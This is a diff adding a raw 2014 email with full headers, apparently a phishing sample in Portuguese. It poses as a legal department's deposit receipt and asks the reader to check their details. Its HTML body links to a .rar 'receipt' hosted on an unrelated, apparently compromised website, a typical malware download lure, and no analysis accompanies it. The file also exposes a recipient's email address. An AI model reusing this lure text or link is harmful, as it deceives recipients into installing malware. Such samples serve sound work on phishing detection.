@@ -1,0 +1,82 @@
+Delivered-To: ajuver@gmail.com
+Received: by 10.42.29.135 with SMTP id r7csp788887icc;
+        Wed, 3 Sep 2014 01:49:01 -0700 (PDT)
+X-Received: by 10.194.119.193 with SMTP id kw1mr21632174wjb.82.1409734140872;
+        Wed, 03 Sep 2014 01:49:00 -0700 (PDT)
+Return-Path: <admin@packandmove.net>
+Received: from mail.packandmove.net ([62.150.11.29])
+        by mx.google.com with ESMTPS id dn8si1758396wib.18.2014.09.03.01.48.56
+        for <multiple recipients>
+        (version=TLSv1 cipher=ECDHE-RSA-AES128-SHA bits=128/128);
+        Wed, 03 Sep 2014 01:49:00 -0700 (PDT)
+Received-SPF: pass (google.com: domain of admin@packandmove.net designates 62.150.11.29 as permitted sender) client-ip=62.150.11.29;
+Authentication-Results: mx.google.com;
+       spf=pass (google.com: domain of admin@packandmove.net designates 62.150.11.29 as permitted sender) smtp.mail=admin@packandmove.net
+Received: from [64.31.54.28] (192.168.0.15) by EX01.pnm.domain (192.168.0.18)
+ with Microsoft SMTP Server (TLS) id 15.0.847.32; Wed, 3 Sep 2014 11:47:28
+ +0300
+Content-Type: multipart/alternative; boundary="===============0739417154=="
+MIME-Version: 1.0
+Subject: Segue comprovante de deposito em conta - 02/09/2014 19:45:10
+To: Recipients <admin@packandmove.net>
+From: "[Depto. Júridico]" <admin@packandmove.net>
+Date: Wed, 3 Sep 2014 05:46:58 -0300
+Message-ID: <509983b2-59e5-4d1c-871d-c779f24d093e@EX01.pnm.domain>
+Return-Path: admin@packandmove.net
+X-ClientProxiedBy: EX01.pnm.domain (192.168.0.18) To EX01.pnm.domain
+ (192.168.0.18)
+X-Antivirus: avast! (VPS 141011-0, 11/10/2014), Inbound message
+X-Antivirus-Status: Clean
+
+--===============0739417154==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+  Comprovante-Deposito-02092014
+ =
+
+ Segue em anexo o comprovante de dep-sito em conta.
+ Pedimos que confira seus dados e verifique se todas as informa--es est-o c=
+orretas.
+ =
+
+ Ateciosamente,
+  Dept. Jur-dico. =
+
+  Email enviado na data 02/09/2014 -s 19:45.
+=20
+--===============0739417154==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html xmlns=3D"http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1" />
+<title>Deposito</title>
+</head>
+
+<body>
+<p><img src=3D"https://ci5.googleusercontent.com/proxy/AKiNjcVQu7lTsa67Pv93=
+ffeFu9Ze4WCpCWiUqQBdw9H1SJv5mX5ao2kADyhwVk42pD4nB86Ev2AxP0I5fNIGmlCYbvzvlwt=
+dXa5-u4l6wDofKBg6rNEFIzvagaZZN2ZF7XRD8V4HBObEmRtQ-FHVmBQ=3Ds0-d-e1-ft#http:=
+//t0.gstatic.com/images?q=3Dtbn:ANd9GcQqI47JuIuQYLgvk79z1ksjl0CyLtDUzDmuMPW=
+tD-i43UkvIlow" width=3D"35" height=3D"35" /> <a href=3D"http://www.pharmage=
+l.gr/plugins/system/comprovantes/abrir.php?ver=3D?ver=3DComprovante-Deposit=
+o-02092014.rar">Comprovante-Deposito-02092014</a></p>
+<hr />
+<p>Segue em anexo o comprovante de dep&oacute;sito em conta.</p>
+<p>Pedimos que confira seus dados e verifique se todas as informa&ccedil;&o=
+tilde;es est&atilde;o corretas.<br />
+</p>
+<p>Ateciosamente,</p>
+<p> Dept. Jur&iacute;dico.  </p>
+<p> Email enviado na data 02/09/2014 &agrave;s 19:45.</p>
+</body>
+</html>
+
+--===============0739417154==--
